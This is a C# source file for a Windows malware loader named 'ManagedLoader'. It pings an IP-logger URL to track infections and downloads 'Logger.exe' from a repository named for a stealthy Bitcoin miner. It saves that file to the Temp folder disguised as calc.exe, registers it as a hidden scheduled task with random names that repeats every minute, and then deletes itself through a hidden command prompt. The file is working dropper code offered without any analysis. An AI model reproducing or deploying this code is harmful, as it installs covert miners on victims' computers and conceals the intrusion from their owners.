using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
namespace ManagedLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            Logger("https://iplogger.com/1EAvN6");
            Download("https://github.com/ims0rry/Sneaky_btc_miner_winx86/raw/master/Logger.exe", "calc.exe");
            schedule(Environment.GetEnvironmentVariable("Temp") + "\\calc.exe");
            SelfDelete("1");
        }

        public static void Logger(string link)
        {
            WebRequest request = WebRequest.Create(link);
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
            request.GetResponse(); 
        }

        public static void Download(string url, string filename)
        {
            filename = Environment.GetEnvironmentVariable("Temp") + "\\" + filename;
            using (var client = new WebClient())
            {
                client.DownloadFile(url, filename);
            }
        }

        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static void schedule(string path)
        {
            var process = new Process();
            process.StartInfo = new ProcessStartInfo("cmd", "/C " + "schtasks /create /tn \\"+generateString()+ "\\" + generateString() + " /tr " + path + " /st 00:00 /du 9999:59 /sc once /ri 1 /f");
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }

        public static String generateString()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            string result = "";
            Random rnd = new Random();
            int iter = rnd.Next(0, abc.Length);
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];

            return result;
        }


    }
}
